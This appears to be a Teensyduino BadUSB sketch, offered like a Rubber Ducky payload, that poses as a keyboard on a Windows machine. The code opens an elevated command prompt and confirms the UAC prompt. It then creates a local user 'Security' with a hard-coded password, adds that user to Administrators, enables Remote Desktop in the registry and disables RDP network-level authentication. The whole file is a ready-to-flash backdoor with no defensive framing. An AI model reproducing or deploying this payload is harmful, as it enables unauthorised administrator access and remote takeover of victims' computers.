/*
TeensyDuino ( BadUSB) Like a Rubber Ducky )
 
You can buy Teensy >> ( https://www.pjrc.com/teensy/teensyduino.html )
Tutorial >> ( https://www.pjrc.com/teensy/teensyduino.html ) , Youtube.com or Google.com :>
PAYLOAD : 

CREATE USER WITH ADMINISTRATOR - ENABLE REMOTE DESTKOP :> 

@ Edo -m- you can contact me in screetsec@gmail.com
*/



int ds = 500;

#if defined(CORE_TEENSY)
#define LED_PIN 13
#endif

void setup()
{

  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);
  // turn the LED on while running
  digitalWrite(LED_PIN, HIGH);
  
  delay(3000);
  show_desktop();
  
  delay(3000);
  cmd_admin();
  
  delay(3000);
  send_altyes();

  delay(1000);
  Keyboard.print("ipconfig");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(1000);
  Keyboard.print("net user /add Security S3CUR1TY!");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(1000);
  Keyboard.print("net localgroup administrators Security /add");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(1000);
  Keyboard.print("powershell set-ItemProperty -Path \'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server'-name \"fDenyTSConnections\" -Value 0");  /* Remote Desktop Command */
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();


  delay(1000);
  Keyboard.print("Powershell set-ItemProperty -Path \'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"UserAuthentication\" -Value 0");  /*Disable secure RDP authentication */
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
    
  delay(2000); 
  Keyboard.print("exit");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();

}

void loop(){
    // blink quickly when complete
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}

void show_desktop(){
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_D);
  Keyboard.send_now();
  delay(500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void send_altyes(){
  delay(1000);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_Y);
  Keyboard.send_now();
  delay(100);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }
  
void cmd_admin(){
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.send_now();
  delay(1000);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(2000);
  Keyboard.print("cmd");
  
  delay(2000);
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(200);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
